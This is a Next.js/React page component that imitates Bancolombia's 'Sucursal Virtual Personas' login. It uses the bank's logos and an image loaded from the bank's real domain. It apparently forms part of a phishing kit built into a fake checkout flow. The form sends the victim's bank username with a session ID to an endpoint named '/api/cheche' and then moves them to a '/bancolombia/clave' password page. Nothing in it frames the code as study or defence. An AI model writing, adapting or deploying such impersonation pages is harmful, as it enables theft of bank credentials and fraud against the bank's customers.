'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaUsuarioPage() {
  const [usuario, setUsuario] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
  }, [searchParams, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!usuario.trim()) return;

    setLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_user',
          sessionId,
          usuario: usuario.trim()
        })
      });

      if (response.ok) {
        router.push(`/bancolombia/clave?sessionId=${sessionId}`);
      }
    } catch (error) {
      console.error('Error updating user:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCancel = () => {
    router.push('/checkout');
  };

  return (
    <div className="min-h-screen bg-gray-50 relative">
      {/* Background with auth-trazo image */}
      <div 
        className="min-h-screen bg-no-repeat bg-center bg-cover"
        style={{
          backgroundImage: `url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg')`
        }}
      >
        <div className="container mx-auto px-4 py-8">
          {/* Header with logo */}
          <div className="flex justify-center mt-12 mb-8">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-12 object-contain"
            />
          </div>

          {/* Title */}
          <h1 className="text-center text-gray-600 text-lg font-light mb-12">
            Sucursal Virtual Personas
          </h1>

          {/* Form Container */}
          <div className="flex justify-center">
            <div className="w-full max-w-md">
              {/* Card */}
              <div className="bg-white rounded-xl shadow-lg p-8">
                <div className="text-center mb-6">
                  <h2 className="text-2xl font-bold text-gray-900 mb-3">¡Hola!</h2>
                  <p className="text-gray-600 text-sm">
                    Ingresa los datos para gestionar tus productos y hacer transacciones.
                  </p>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="relative">
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      <svg className="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <input
                      type="text"
                      id="usuario"
                      value={usuario}
                      onChange={(e) => setUsuario(e.target.value)}
                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition text-base"
                      placeholder="Usuario"
                      disabled={loading}
                      autoFocus
                      autoComplete="username"
                    />
                    <label className="absolute left-10 top-3 text-gray-400 text-sm pointer-events-none">
                      Usuario
                    </label>
                  </div>

                  <button
                    type="submit"
                    disabled={!usuario.trim() || loading}
                    className="w-full py-3 px-6 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
                  >
                    {loading ? (
                      <span className="flex items-center justify-center">
                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Validando...
                      </span>
                    ) : (
                      'Iniciar sesión'
                    )}
                  </button>
                </form>

                <div className="text-center mt-6">
                  <button
                    onClick={handleCancel}
                    className="text-blue-600 hover:text-blue-700 underline text-sm"
                  >
                    Crear usuario
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Footer Logo */}
          <div className="text-center mt-12">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-6 mx-auto opacity-60"
            />
          </div>
        </div>
      </div>
    </div>
  );
}